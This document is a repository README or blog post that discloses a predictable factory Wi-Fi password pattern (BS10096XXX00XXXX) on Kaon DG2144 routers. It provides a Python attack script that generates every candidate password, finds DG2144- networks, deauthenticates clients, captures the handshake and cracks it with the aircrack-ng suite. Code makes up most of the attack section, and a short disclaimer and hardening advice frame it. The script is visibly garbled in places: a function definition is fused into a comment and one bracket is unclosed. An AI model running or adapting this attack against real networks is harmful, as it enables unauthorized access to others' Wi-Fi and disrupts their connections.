# WIikaonWi
a script to take advantage of simple wifi credentials in the KAON DG2144 and other similar devices.
Wikaonwi: A Factory Wi-Fi Credential Vulnerability

Date: 1/21/25 9:35 PM

Wikaonwi:

In the ever-evolving landscape of cybersecurity, vulnerabilities can often be found in the most unexpected places. One such vulnerability has been identified in the Kaon DG2144 router, where the factory Wi-Fi password is not as random as one might expect. This flaw can lead to the easy recovery of a device's Wi-Fi credentials, posing a significant risk to users. In this blog post, we will explore the details of this vulnerability, how it can be exploited, and provide a proof of concept for educational purposes.
Understanding the Vulnerability

The Kaon DG2144 router has a predictable pattern in its factory-set Wi-Fi passwords. Instead of being randomly generated, the passwords are based on the device's serial number, which follows a specific format. For example, consider the following serial numbers:


        

        BS10096321004321

        BS10096123001234

        BS10096XXX00XXXX

        

    

The passwords are constructed using a fixed prefix (BS10096) followed by a combination of numbers, making them susceptible to brute-force attacks. The predictable nature of these passwords means that an attacker can easily generate all possible combinations and attempt to gain access to the Wi-Fi network.These devices also have a prefixed SSID which makes them easier to identify being DG2144-XXXX
How We Can Exploit This Vulnerability

To exploit this vulnerability, an attacker can follow these steps:

    Generate All Possible Combinations: Using the known format of the password, generate all possible combinations based on the serial number structure. The format is as follows: BS10096(000-999)00(0000-9999).
    Scan for Target Wi-Fi Networks: Identify Wi-Fi networks that start with the SSID prefix DG2144-.
    Deauthenticate Connected Clients: Use a deauthentication attack to disconnect clients from the target Wi-Fi network, forcing the router to send a handshake when clients reconnect.
    Capture the Handshake: Monitor the network to capture the handshake, which contains the necessary information to crack the password.
    Crack the Handshake: Use the generated combinations to attempt to crack the captured handshake and recover the Wi-Fi password.

Proof of Concept Code

Below is a Python script that demonstrates the steps outlined above. This script is for educational purposes only and should not be used for malicious activities.


```        
        
import subprocess
import time
import os
import re

# Replace wlan0 with your wireless interface
def generate_combinations():
    first_part = "BS10096"
    combinations = []

    for i in range(1000): 
        for j in range(10000): 
            combinations.append(f"{first_part}{i:03}00{j:04}")
    return combinations

def save_combinations_to_file(combinations, filename='combinations.txt'):
    with open(filename, 'w') as f:
        for combo in combinations:
            f.write(combo + '\n')

def scan_for_wifi():
    print("Scanning for Wi-Fi networks...")
    output = subprocess.check_output(["airodump-ng", "wlan0"], universal_newlines=True) 
    return output

def extract_bssid(output, target_ssid):
    bssid_pattern = re.compile(r'([0-9A-Fa-f:]{17})\s+.*\s+{}\s+'.format(target_ssid))
    bssids = bssid_pattern.findall(output)
    return bssids


def deauth_clients(bssid):
    print(f"Deauthenticating clients from {bssid}...")
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "wlan0"]) 

def capture_handshake(bssid, output_file='captured_handshake.cap'):
    print(f"Capturing handshake for {bssid}...")
    subprocess.run(["airodump-ng", "--bssid", bssid, "-c", "6", "-w", output_file, "wlan0"]) 
    time.sleep(30)  # Wait for the handshake def crack_handshake(bssid, combinations_file='combinations.txt', handshake_file='captured_handshake.cap'):
    print(f"Cracking handshake for {bssid}...")
    subprocess.run(["aircrack-ng", "-w", combinations_file, "-b", bssid, handshake_file])

def print_banner():
    banner = r"""
                 d8, d8b                                                    d8,
                `8P  ?88                                                   `8P 
                      88b                                                      
 ?88   d8P  d8P  88b  888  d88' d888b8b   d8888b   88bd88b  ?88   d8P  d8P  88b
 d88  d8P' d8P'  88P  888bd8P' d8P' ?88  d8P' ?88  88P' ?8b d88  d8P' d8P'  88P
 ?8b ,88b ,88'  d88  d88888b   88b  ,88b 88b  d88 d88   88P ?8b ,88b ,88'  d88 
 `?888P'888P'  d88' d88' `?88b,`?88P'`88b`?8888P'd88'   88b `?888P'888P'  d88' 

    """                                                                          
    print(banner)                                                                 

def main():
    print_banner()
    target_ssid = "DG2144-"
    combinations = generate_combinations()
    save_combinations_to_file(combinations)

    # Scan for Wi-Fi networks
    output = scan_for_wifi()
    # Extract BSSID dynamically
    bssids = extract_bssid(output, target_ssid)
    if not bssids:
        print("No BSSID found for the target SSID.")
        return

    print("Available BSSIDs:")
    for bssid in bssids:
        print(bssid)

    # Select the first BSSID found
    selected_bssid = bssids[0
    # Deauthenticate clients
    deauth_clients(selected_bssid)
    # Capture the handshake
    capture_handshake(selected_bssid)
    # Crack the handshake
    crack_handshake(selected_bssid)
    
if __name__ == "__main__":
    main()

    
```
    

Conclusion

The vulnerability in the Kaon DG2144 router highlights the importance of strong, unpredictable passwords for network security. By understanding how such vulnerabilities can be exploited, users can take proactive measures to secure their devices. It is crucial to change factory-set passwords to unique, complex ones to mitigate the risk of unauthorized access. Always stay informed about potential vulnerabilities in your devices and take necessary precautions to protect your network.
